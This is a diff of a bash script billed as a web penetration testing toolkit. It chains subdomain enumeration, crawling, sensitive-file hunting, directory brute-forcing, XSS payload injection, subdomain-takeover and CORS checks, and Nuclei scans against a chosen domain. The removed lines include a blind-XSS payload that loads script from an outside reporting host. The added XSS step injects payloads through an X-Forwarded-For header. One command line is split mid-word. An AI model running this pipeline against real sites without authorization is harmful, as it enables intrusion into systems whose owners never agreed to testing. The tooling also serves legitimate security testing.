@@ -55,7 +55,7 @@ display_help() {
 list_steps() {
     echo -e "${WHITE}${BOLD}AVAILABLE STEPS:${RESET}"
     echo -e "${GREEN}1.${RESET} Subdomain Enumeration (subfinder)"
-    echo -e "${GREEN}2.${RESET} Find Alive Subdomains (httpx-toolkit)"
+    echo -e "${GREEN}2.${RESET} Find Alive Subdomains (httprobe)"
     echo -e "${GREEN}3.${RESET} URL Crawling (katana)"
     echo -e "${GREEN}4.${RESET} Find Sensitive Files"
     echo -e "${GREEN}5.${RESET} Extract JavaScript Files"
@@ -141,87 +141,311 @@ step_subdomain_enumeration() {
     esac
 }
 
-
-# Step 2: Find Alive Subdomains (updated to httprobe)
+# Step 2: Find Alive Subdomains using httprobe
 step_alive_subdomains() {
     CURRENT_STEP=2
     display_progress
     
     echo -e "${BLUE}[*] Step 2: Find Alive Subdomains${RESET}"
-    echo -e "${YELLOW}[*] Running: cat subdomain.txt | httprobe -p 80,443,8080,8000,8888 -c 200 > subdomains_alive.txt${RESET}"
+    echo -e "${YELLOW}[*] Running: cat subdomain.txt | httprobe > subdomains_alive.txt${RESET}"
     
     if $VERBOSE; then
-        cat subdomain.txt | httprobe -p 80,443,8080,8000,8888 -c 200 | tee subdomains_alive.txt
+        cat subdomain.txt | httprobe | tee subdomains_alive.txt
     else
-        cat subdomain.txt | httprobe -p 80,443,8080,8000,8888 -c 200 > subdomains_alive.txt
+        cat subdomain.txt | httprobe > subdomains_alive.txt
     fi
     
-    # ... [Rest of the function remains the same] ...
+    local count=$(wc -l < subdomains_alive.txt)
+    echo -e "${GREEN}[+] Found ${WHITE}${count}${GREEN} alive subdomains.${RESET}"
+    
+    # Ask user what to do next
+    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
+    echo -e "   ${WHITE}1)${RESET} Proceed to Step 3 (URL Crawling)"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
+    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
+    read -p "Enter your choice [1-3]: " choice
+    
+    case $choice in
+        1)
+            step_url_crawling
+            ;;
+        2)
+            save_results 2 "subdomains_alive.txt"
+            step_alive_subdomains
+            ;;
+        3)
+            save_results 2 "subdomains_alive.txt"
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
+            step_alive_subdomains
+            ;;
+    esac
 }
 
-# Step 8: XSS Vulnerability Testing (updated to httprobe)
+# Step 3: URL Crawling
+step_url_crawling() {
+    CURRENT_STEP=3
+    display_progress
+    
+    echo -e "${BLUE}[*] Step 3: URL Crawling${RESET}"
+    echo -e "${YELLOW}[*] Running: katana -list subdomains_alive.txt -jc -kf all -o allurls.txt${RESET}"
+    
+    if $VERBOSE; then
+        katana -list subdomains_alive.txt -jc -kf all | tee allurls.txt
+    else
+        katana -list subdomains_alive.txt -jc -kf all -o allurls.txt
+    fi
+    
+    local count=$(wc -l < allurls.txt)
+    echo -e "${GREEN}[+] Found ${WHITE}${count}${GREEN} URLs.${RESET}"
+    
+    # Ask user what to do next
+    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
+    echo -e "   ${WHITE}1)${RESET} Proceed to Step 4 (Find Sensitive Files)"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
+    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
+    read -p "Enter your choice [1-3]: " choice
+    
+    case $choice in
+        1)
+            step_find_sensitive_files
+            ;;
+        2)
+            save_results 3 "allurls.txt"
+            step_url_crawling
+            ;;
+        3)
+            save_results 3 "allurls.txt"
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
+            step_url_crawling
+            ;;
+    esac
+}
+
+# Step 4: Find Sensitive Files
+step_find_sensitive_files() {
+    CURRENT_STEP=4
+    display_progress
+    
+    echo -e "${BLUE}[*] Step 4: Find Sensitive Files${RESET}"
+    echo -e "${YELLOW}[*] Running: cat allurls.txt | grep -E \".txt|.log|.cache|.secret|.db|.backup|.yml|.json|.gz|.rar|.zip|.config\" > sensitive_files.txt${RESET}"
+    
+    if $VERBOSE; then
+        cat allurls.txt | grep -E ".txt|.log|.cache|.secret|.db|.backup|.yml|.json|.gz|.rar|.zip|.config" | tee sensitive_files.txt
+    else
+        cat allurls.txt | grep -E ".txt|.log|.cache|.secret|.db|.backup|.yml|.json|.gz|.rar|.zip|.config" > sensitive_files.txt
+    fi
+    
+    local count=$(wc -l < sensitive_files.txt)
+    echo -e "${GREEN}[+] Found ${WHITE}${count}${GREEN} potentially sensitive files.${RESET}"
+    
+    # Ask user what to do next
+    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
+    echo -e "   ${WHITE}1)${RESET} Proceed to Step 5 (Extract JavaScript Files)"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
+    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
+    read -p "Enter your choice [1-3]: " choice
+    
+    case $choice in
+        1)
+            step_extract_js_files
+            ;;
+        2)
+            save_results 4 "sensitive_files.txt"
+            step_find_sensitive_files
+            ;;
+        3)
+            save_results 4 "sensitive_files.txt"
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
+            step_find_sensitive_files
+            ;;
+    esac
+}
+
+# Step 5: Extract JavaScript Files
+step_extract_js_files() {
+    CURRENT_STEP=5
+    display_progress
+    
+    echo -e "${BLUE}[*] Step 5: Extract JavaScript Files${RESET}"
+    echo -e "${YELLOW}[*] Running: cat allurls.txt | grep -i \"\\.js$\" > js_files.txt${RESET}"
+    
+    if $VERBOSE; then
+        cat allurls.txt | grep -i "\.js$" | tee js_files.txt
+    else
+        cat allurls.txt | grep -i "\.js$" > js_files.txt
+    fi
+    
+    local count=$(wc -l < js_files.txt)
+    echo -e "${GREEN}[+] Found ${WHITE}${count}${GREEN} JavaScript files.${RESET}"
+    
+    # Ask user what to do next
+    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
+    echo -e "   ${WHITE}1)${RESET} Proceed to Step 6 (Scan JavaScript Exposures)"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
+    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
+    read -p "Enter your choice [1-3]: " choice
+    
+    case $choice in
+        1)
+            step_scan_js_exposures
+            ;;
+        2)
+            save_results 5 "js_files.txt"
+            step_extract_js_files
+            ;;
+        3)
+            save_results 5 "js_files.txt"
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
+            step_extract_js_files
+            ;;
+    esac
+}
+
+# Step 6: Scan JavaScript Exposures
+step_scan_js_exposures() {
+    CURRENT_STEP=6
+    display_progress
+    
+    echo -e "${BLUE}[*] Step 6: Scan JavaScript Exposures${RESET}"
+    echo -e "${YELLOW}[*] Running: nuclei -list js_files.txt -t ~/nuclei-templates/exposures/ -o js_exposures.txt${RESET}"
+    
+    if $VERBOSE; then
+        nuclei -list js_files.txt -t ~/nuclei-templates/exposures/ | tee js_exposures.txt
+    else
+        nuclei -list js_files.txt -t ~/nuclei-templates/exposures/ -o js_exposures.txt
+    fi
+    
+    # Ask user what to do next
+    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
+    echo -e "   ${WHITE}1)${RESET} Proceed to Step 7 (Directory Bruteforce)"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
+    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
+    read -p "Enter your choice [1-3]: " choice
+    
+    case $choice in
+        1)
+            step_directory_bruteforce
+            ;;
+        2)
+            save_results 6 "js_exposures.txt"
+            step_scan_js_exposures
+            ;;
+        3)
+            save_results 6 "js_exposures.txt"
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
+            step_scan_js_exposures
+            ;;
+    esac
+}
+
+# Step 7: Directory Bruteforce
+step_directory_bruteforce() {
+    CURRENT_STEP=7
+    display_progress
+    
+    echo -e "${BLUE}[*] Step 7: Directory Bruteforce${RESET}"
+    echo -e "${YELLOW}[*] Running: dirsearch -l subdomains_alive.txt -o directory_bruteforce.txt${RESET}"
+    
+    if $VERBOSE; then
+        dirsearch -l subdomains_alive.txt | tee directory_bruteforce.txt
+    else
+        dirsearch -l subdomains_alive.txt -o directory_bruteforce.txt
+    fi
+    
+    # Ask user what to do next
+    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
+    echo -e "   ${WHITE}1)${RESET} Proceed to Step 8 (XSS Testing)"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
+    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
+    read -p "Enter your choice [1-3]: " choice
+    
+    case $choice in
+        1)
+            step_xss_testing
+            ;;
+        2)
+            save_results 7 "directory_bruteforce.txt"
+            step_directory_bruteforce
+            ;;
+        3)
+            save_results 7 "directory_bruteforce.txt"
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
+            step_directory_bruteforce
+            ;;
+    esac
+}
+
+# Step 8: XSS Testing
 step_xss_testing() {
     CURRENT_STEP=8
     display_progress
     
-    echo -e "${BLUE}[*] Step 8: XSS Vulnerability Testing${RESET}"
-    echo -e "${YELLOW}[*] Running: subfinder -d $DOMAIN | httprobe -p 80,443,8080,8000,8888 -c 200 | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\"<script src=https://xss.report/c/YOUR_USERNAME></script>' -parameters > xss_results.txt${RESET}"
+    echo -e "${BLUE}[*] Step 8: XSS Testing${RESET}"
+    echo -e "${YELLOW}[*] Running: cat allurls.txt | gf xss | bxss -payload xss_payloads.txt -header \"X-Forwarded-For: \${payload}\" > xss_results.txt${RESET}"
     
     if $VERBOSE; then
-        subfinder -d "$DOMAIN" | httprobe -p 80,443,8080,8000,8888 -c 200 | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"<script src=https://xss.report/c/YOUR_USERNAME></script>' -parameters | tee xss_results.txt
+        cat allurls.txt | gf xss | bx
+ss -payload xss_payloads.txt -header "X-Forwarded-For: \${payload}" | tee xss_results.txt
     else
-        subfinder -d "$DOMAIN" | httprobe -p 80,443,8080,8000,8888 -c 200 | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"<script src=https://xss.report/c/YOUR_USERNAME></script>' -parameters > xss_results.txt
+        cat allurls.txt | gf xss | bxss -payload xss_payloads.txt -header "X-Forwarded-For: \${payload}" > xss_results.txt
     fi
     
-    # ... [Rest of the function remains the same] ...
+    # Ask user what to do next
+    echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
+    echo -e "   ${WHITE}1)${RESET} Proceed to Step 9 (Subdomain Takeover)"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
+    echo -e "   ${WHITE}3)${RESET} Save results and return to main menu"
+    read -p "Enter your choice [1-3]: " choice
+    
+    case $choice in
+        1)
+            step_subdomain_takeover
+            ;;
+        2)
+            save_results 8 "xss_results.txt"
+            step_xss_testing
+            ;;
+        3)
+            save_results 8 "xss_results.txt"
+            return
+            ;;
+        *)
+            echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
+            step_xss_testing
+            ;;
+    esac
 }
 
-# Updated dependency check
-check_dependencies() {
-    missing=()
-    # Changed from httpx-toolkit to httprobe
-    for tool in subfinder httprobe katana nuclei dirsearch subzy gf bxss; do
-        if ! command -v $tool &> /dev/null; then
-            missing+=($tool)
-        fi
-    done
-    
-    if [[ ${#missing[@]} -gt 0 ]]; then
-        echo -e "${RED}[!] The following tools are missing: ${missing[*]}${RESET}"
-        echo -e "${YELLOW}[*] Please install the missing tools to use the toolkit properly."
-        echo -e "    Install httprobe with: go install github.com/tomnomnom/httprobe@latest${RESET}"
-        return 1
-    fi
-    
-    return 0
-}
-
-# ... [Rest of the script remains the same] ...
 # Step 9: Subdomain Takeover Check
 step_subdomain_takeover() {
     CURRENT_STEP=9
     display_progress
     
     echo -e "${BLUE}[*] Step 9: Subdomain Takeover Check${RESET}"
-    echo -e "${YELLOW}[*] Running: subzy run --targets subdomain.txt --concurrency 100 --hide_fails --verify_ssl > subdomain_takeover.txt${RESET}"
+    echo -e "${YELLOW}[*] Running: subzy run --targets subdomains_alive.txt > subdomain_takeover.txt${RESET}"
     
     if $VERBOSE; then
-        subzy run --targets subdomain.txt --concurrency 100 --hide_fails --verify_ssl | tee subdomain_takeover.txt
+        subzy run --targets subdomains_alive.txt | tee subdomain_takeover.txt
     else
-        subzy run --targets subdomain.txt --concurrency 100 --hide_fails --verify_ssl > subdomain_takeover.txt
-    fi
-    
-    # Check if the file exists and has content
-    if [[ -f "subdomain_takeover.txt" && -s "subdomain_takeover.txt" ]]; then
-        echo -e "${GREEN}[+] Subdomain takeover check completed. Results saved to subdomain_takeover.txt${RESET}"
-        
-        if $VERBOSE; then
-            echo -e "${YELLOW}[*] Potential subdomain takeover vulnerabilities:${RESET}"
-            cat subdomain_takeover.txt
-        fi
-    else
-        echo -e "${GREEN}[+] No subdomain takeover vulnerabilities found.${RESET}"
-        echo "No subdomain takeover vulnerabilities found" > subdomain_takeover.txt
+        subzy run --targets subdomains_alive.txt > subdomain_takeover.txt
     fi
     
     # Ask user what to do next
@@ -256,34 +480,12 @@ step_cors_check() {
     display_progress
     
     echo -e "${BLUE}[*] Step 10: CORS Misconfiguration Check${RESET}"
-    echo -e "${YELLOW}[*] Running: python3 corsy.py -i subdomains_alive.txt -t 10 --headers \"User-Agent: GoogleBot\nCookie: SESSION=Hacked\" > cors_misconfig.txt${RESET}"
+    echo -e "${YELLOW}[*] Running: python3 corsy.py -i subdomains_alive.txt -t 10 > cors_results.txt${RESET}"
     
     if $VERBOSE; then
-        python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked" | tee cors_misconfig.txt
+        python3 corsy.py -i subdomains_alive.txt -t 10 | tee cors_results.txt
     else
-        python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked" > cors_misconfig.txt
-    fi
-    
-    # Check if the file exists and has content
-    if [[ -f "cors_misconfig.txt" && -s "cors_misconfig.txt" ]]; then
-        echo -e "${GREEN}[+] CORS misconfiguration check completed. Results saved to cors_misconfig.txt${RESET}"
-        
-        if $VERBOSE; then
-            echo -e "${YELLOW}[*] CORS misconfiguration issues:${RESET}"
-            cat cors_misconfig.txt
-        fi
-    else
-        echo -e "${GREEN}[+] No CORS misconfiguration issues found.${RESET}"
-        echo "No CORS misconfiguration issues found" > cors_misconfig.txt
-    fi
-    
-    # Also run nuclei for CORS
-    echo -e "${YELLOW}[*] Running: nuclei -list subdomains_alive.txt -t ~/Priv8-Nuclei/cors -o cors_nuclei.txt${RESET}"
-    
-    if $VERBOSE; then
-        nuclei -list subdomains_alive.txt -t ~/Priv8-Nuclei/cors | tee cors_nuclei.txt
-    else
-        nuclei -list subdomains_alive.txt -t ~/Priv8-Nuclei/cors -o cors_nuclei.txt
+        python3 corsy.py -i subdomains_alive.txt -t 10 > cors_results.txt
     fi
     
     # Ask user what to do next
@@ -298,13 +500,11 @@ step_cors_check() {
             step_security_scan
             ;;
         2)
-            save_results 10 "cors_misconfig.txt"
-            save_results 10 "cors_nuclei.txt"
+            save_results 10 "cors_results.txt"
             step_cors_check
             ;;
         3)
-            save_results 10 "cors_misconfig.txt"
-            save_results 10 "cors_nuclei.txt"
+            save_results 10 "cors_results.txt"
             return
             ;;
         *)
@@ -319,43 +519,31 @@ step_security_scan() {
     CURRENT_STEP=11
     display_progress
     
-    echo -e "${BLUE}[*] Step 11: Security Scan with Nuclei${RESET}"
-    echo -e "${YELLOW}[*] Running: nuclei -list subdomains_alive.txt -tags cves,osint,tech -o security_scan.txt${RESET}"
+    echo -e "${BLUE}[*] Step 11: Security Scan${RESET}"
+    echo -e "${YELLOW}[*] Running: nuclei -list subdomains_alive.txt -t ~/nuclei-templates/ -o security_scan.txt${RESET}"
     
     if $VERBOSE; then
-        nuclei -list subdomains_alive.txt -tags cves,osint,tech | tee security_scan.txt
+        nuclei -list subdomains_alive.txt -t ~/nuclei-templates/ | tee security_scan.txt
     else
-        nuclei -list subdomains_alive.txt -tags cves,osint,tech -o security_scan.txt
+        nuclei -list subdomains_alive.txt -t ~/nuclei-templates/ -o security_scan.txt
     fi
     
-    # Also run additional checks
-    echo -e "${YELLOW}[*] Running: cat allurls.txt | gf lfi | nuclei -tags lfi -o lfi_vulnerabilities.txt${RESET}"
-    cat allurls.txt | gf lfi | nuclei -tags lfi -o lfi_vulnerabilities.txt
-    
-    echo -e "${YELLOW}[*] Running: cat allurls.txt | gf redirect | openredirex -p ~/openRedirect -o open_redirect.txt${RESET}"
-    cat allurls.txt | gf redirect | openredirex -p ~/openRedirect -o open_redirect.txt
-    
     echo -e "${GREEN}[+] Security scan completed.${RESET}"
-    echo -e "${GREEN}[+] Results saved to:${RESET}"
-    echo -e "${WHITE}   - security_scan.txt${RESET}"
-    echo -e "${WHITE}   - lfi_vulnerabilities.txt${RESET}"
-    echo -e "${WHITE}   - open_redirect.txt${RESET}"
     
     # Ask user what to do next
     echo -e "${YELLOW}[?] What would you like to do next?${RESET}"
-    echo -e "   ${WHITE}1)${RESET} Save all results"
-    echo -e "   ${WHITE}2)${RESET} Return to main menu"
+    echo -e "   ${WHITE}1)${RESET} Save results and return to main menu"
+    echo -e "   ${WHITE}2)${RESET} Save results and stay on this step"
     read -p "Enter your choice [1-2]: " choice
     
     case $choice in
         1)
             save_results 11 "security_scan.txt"
-            save_results 11 "lfi_vulnerabilities.txt"
-            save_results 11 "open_redirect.txt"
-            echo -e "${GREEN}[+] All results saved.${RESET}"
+            return
             ;;
         2)
-            return
+            save_results 11 "security_scan.txt"
+            step_security_scan
             ;;
         *)
             echo -e "${RED}[!] Invalid choice. Please try again.${RESET}"
@@ -364,132 +552,73 @@ step_security_scan() {
     esac
 }
 
-# Function to start workflow
-start_workflow() {
-    validate_domain || return
-    step_subdomain_enumeration
-}
-
 # Main loop
-main() {
+while true; do
     display_banner
     
-    while true; do
-        echo -e "${WHITE}wptt> ${RESET}" && read -e command
-        
-        case $command in
-            help)
-                display_help
-                ;;
-            list\ steps)
-                list_steps
-                ;;
-            set\ domain\ *)
-                DOMAIN=$(echo $command | cut -d' ' -f3)
+    read -p "wptt> " cmd args
+    
+    case $cmd in
+        help)
+            display_help
+            ;;
+        "set")
+            if [[ "$args" =~ ^domain\ (.+)$ ]]; then
+                DOMAIN="${BASH_REMATCH[1]}"
                 validate_domain
-                display_banner
-                ;;
-            start)
-                if validate_domain; then
-                    start_workflow
-                fi
-                display_banner
-                ;;
-            verbose\ on)
+            else
+                echo -e "${RED}[!] Invalid command. Use 'set domain example.com'${RESET}"
+            fi
+            ;;
+        start)
+            if validate_domain; then
+                step_subdomain_enumeration
+            fi
+            ;;
+        verbose)
+            if [[ "$args" == "on" ]]; then
                 VERBOSE=true
                 echo -e "${GREEN}[+] Verbose mode enabled${RESET}"
-                ;;
-            verbose\ off)
+            elif [[ "$args" == "off" ]]; then
                 VERBOSE=false
                 echo -e "${GREEN}[+] Verbose mode disabled${RESET}"
-                ;;
-            run\ [1-9]|run\ 1[0-1])
-                step_num=$(echo $command | cut -d' ' -f2)
-                if validate_domain; then
-                    case $step_num in
-                        1) step_subdomain_enumeration ;;
-                        2) step_alive_subdomains ;;
-                        3) step_url_crawling ;;
-                        4) step_find_sensitive_files ;;
-                        5) step_extract_js_files ;;
-                        6) step_scan_js_exposures ;;
-                        7) step_directory_bruteforce ;;
-                        8) step_xss_testing ;;
-                        9) step_subdomain_takeover ;;
-                        10) step_cors_check ;;
-                        11) step_security_scan ;;
-                        *) echo -e "${RED}[!] Invalid step number.${RESET}" ;;
-                    esac
-                fi
-                display_banner
-                ;;
-            save\ [1-9]|save\ 1[0-1])
-                step_num=$(echo $command | cut -d' ' -f2)
-                if validate_domain; then
-                    case $step_num in
-                        1) save_results 1 "subdomain.txt" ;;
-                        2) save_results 2 "subdomains_alive.txt" ;;
-                        3) save_results 3 "allurls.txt" ;;
-                        4) save_results 4 "sensitive_files.txt" ;;
-                        5) save_results 5 "js_files.txt" ;;
-                        6) save_results 6 "js_exposures.txt" ;;
-                        7) save_results 7 "directory_bruteforce.txt" ;;
-                        8) save_results 8 "xss_results.txt" ;;
-                        9) save_results 9 "subdomain_takeover.txt" ;;
-                        10) 
-                            save_results 10 "cors_misconfig.txt"
-                            save_results 10 "cors_nuclei.txt"
-                            ;;
-                        11)
-                            save_results 11 "security_scan.txt"
-                            save_results 11 "lfi_vulnerabilities.txt"
-                            save_results 11 "open_redirect.txt"
-                            ;;
-                        *) echo -e "${RED}[!] Invalid step number.${RESET}" ;;
-                    esac
-                fi
-                ;;
-            clear)
-                display_banner
-                ;;
-            exit)
-                echo -e "${GREEN}[+] Thank you for using Web Penetration Testing Toolkit by Hamza. Goodbye!${RESET}"
-                exit 0
-                ;;
-            *)
-                echo -e "${RED}[!] Unknown command: ${command}${RESET}"
-                echo -e "${YELLOW}[*] Type 'help' to see available commands${RESET}"
-                ;;
-        esac
-    done
-}
-
-# Ensure dependencies are installed
-check_dependencies() {
-    missing=()
-    for tool in subfinder httpx-toolkit katana nuclei dirsearch subzy gf bxss; do
-        if ! command -v $tool &> /dev/null; then
-            missing+=($tool)
-        fi
-    done
-    
-    if [[ ${#missing[@]} -gt 0 ]]; then
-        echo -e "${RED}[!] The following tools are missing: ${missing[*]}${RESET}"
-        echo -e "${YELLOW}[*] Please install the missing tools to use the toolkit properly.${RESET}"
-        return 1
-    fi
-    
-    return 0
-}
-
-# Check if Python script exists
-if [[ ! -f "main.py" ]]; then
-    echo -e "${RED}[!] main.py not found. Please ensure it exists in the same directory.${RESET}"
-    exit 1
-fi
-
-# Make scripts executable
-chmod +x main.py
-
-# Run main function
-main
+            else
+                echo -e "${RED}[!] Invalid argument. Use 'verbose on' or 'verbose off'${RESET}"
+            fi
+            ;;
+        run)
+            if validate_domain; then
+                case $args in
+                    1) step_subdomain_enumeration ;;
+                    2) step_alive_subdomains ;;
+                    3) step_url_crawling ;;
+                    4) step_find_sensitive_files ;;
+                    5) step_extract_js_files ;;
+                    6) step_scan_js_exposures ;;
+                    7) step_directory_bruteforce ;;
+                    8) step_xss_testing ;;
+                    9) step_subdomain_takeover ;;
+                    10) step_cors_check ;;
+                    11) step_security_scan ;;
+                    *) echo -e "${RED}[!] Invalid step number. Use 'list steps' to see available steps.${RESET}" ;;
+                esac
+            fi
+            ;;
+        list)
+            if [[ "$args" == "steps" ]]; then
+                list_steps
+            else
+                echo -e "${RED}[!] Invalid argument. Use 'list steps'${RESET}"
+            fi
+            ;;
+        exit)
+            echo -e "${GREEN}[+] Goodbye!${RESET}"
+            exit 0
+            ;;
+        *)
+            if [[ -n "$cmd" ]]; then
+                echo -e "${RED}[!] Unknown command. Type 'help' for available commands.${RESET}"
+            fi
+            ;;
+    esac
+done
